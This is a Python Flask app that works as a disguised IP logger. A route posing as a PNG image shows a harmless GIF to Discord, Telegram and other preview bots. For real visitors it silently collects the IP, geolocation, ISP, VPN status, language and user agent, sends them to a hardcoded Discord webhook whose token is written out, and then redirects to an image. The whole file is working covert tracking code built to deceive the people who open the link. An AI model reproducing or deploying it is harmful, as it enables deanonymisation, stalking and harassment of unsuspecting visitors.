import os
import requests
from flask import Flask, request, redirect, send_file
import io
from datetime import datetime

app = Flask(__name__)

# THE SECURE ENDPOINT
WEBHOOK_URL = "https://discord.com/api/webhooks/1499405115294093454/AxyBIBWUojFPEoD1bIsyexLxf8gC8yR4fEDBF8eCNKLtWPFGfXZ3EZ28XdDEQCHlEl51"

@app.route('/view/image_01.png')
def logger():
    ua = request.user_agent.string
    ua_low = ua.lower()
    
    # 1. UPDATED BOT FILTERING 
    # (Removed 'apple' and 'google' to ensure your own clicks trigger the webhook)
    if any(x in ua_low for x in ["discord", "telegram", "bot", "crawl", "spider", "slack"]):
        r = requests.get("https://media1.tenor.com/m/ziNSDDTCyiwAAAAC/discord-trolling.gif")
        return send_file(io.BytesIO(r.content), mimetype='image/gif')

    # 2. CORE DATA COLLECTION
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    ref = request.referrer or "System Default/Private"
    lang = request.accept_languages.best or "Unknown"
    dnt = "🛡️ ON" if request.headers.get('DNT') == '1' else "❌ OFF"
    time_utc = datetime.utcnow().strftime("%H:%M:%S UTC")

    # Deep Geo & Infrastructure Lookup
    c, r, cntry, isp, org, asn, mob, vpn, host, tz = "??","??","??","??","??","??","??","??","??","??"
    try:
        g = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()
        if g['status'] == 'success':
            c, r, cntry = g.get('city'), g.get('regionName'), g.get('country')
            isp, org, asn = g.get('isp'), g.get('org'), g.get('as')
            tz = g.get('timezone', 'Unknown')
            mob = "📱 Mobile" if g.get('mobile') else "💻 Desktop/WiFi"
            vpn = "🚨 DETECTED" if g.get('proxy') else "✅ Clean"
            host = "⚠️ DATA CENTER" if g.get('hosting') else "🏠 RESIDENTIAL"
    except: 
        pass

    # 3. THE "OMEGA" EMBED
    payload = {
        "username": "OMEGA-CORE INTERCEPT",
        "avatar_url": "https://i.imgur.com/8N76f9J.png",
        "embeds": [{
            "title": "⚡ HIGH-LEVEL INTERCEPTION DETECTED",
            "description": f"**Ref:** `{ref}` | **Time:** `{time_utc}`",
            "color": 0x000000, 
            "thumbnail": {"url": "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3N5bm9wc2lzX2dpZl9ieV9pZCZjdD1n/3o7TKVUn7iM8FMEU24/giphy.gif"},
            "fields": [
                {"name": "📍 GEOLOCATION", "value": f"```City: {c}\nState: {r}\nCountry: {cntry}\nTZ: {tz}```", "inline": False},
                {"name": "🌐 INFRASTRUCTURE", "value": f"**ISP:** {isp}\n**ASN:** {asn}\n**Org:** {org}", "inline": False},
                {"name": "🛡️ SECURITY STATUS", "value": f"**VPN/Proxy:** {vpn}\n**Hosting:** {host}\n**DNT Header:** {dnt}", "inline": True},
                {"name": "🧬 DEVICE SPECS", "value": f"**Type:** {mob}\n**Lang:** {lang}\n**IP:** `{ip}`", "inline": True},
                {"name": "📄 RAW FINGERPRINT", "value": f"```{ua}```", "inline": False}
            ],
            "footer": {"text": "Project Alpha | FINAL BUILD v6.1 | End of Line"},
        }]
    }
    
    # 4. LOUD ERROR CHECKING
    try:
        response = requests.post(WEBHOOK_URL, json=payload, timeout=10)
        print(f"WEBHOOK LOG: Status {response.status_code}")
        if response.status_code != 204:
            print(f"DISCORD ERROR: {response.text}")
    except Exception as e:
        print(f"CONNECTION ERROR: {e}")

    # 5. FINAL REDIRECT
    return redirect("https://i.imgur.com/BcNs5vF.jpg")

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
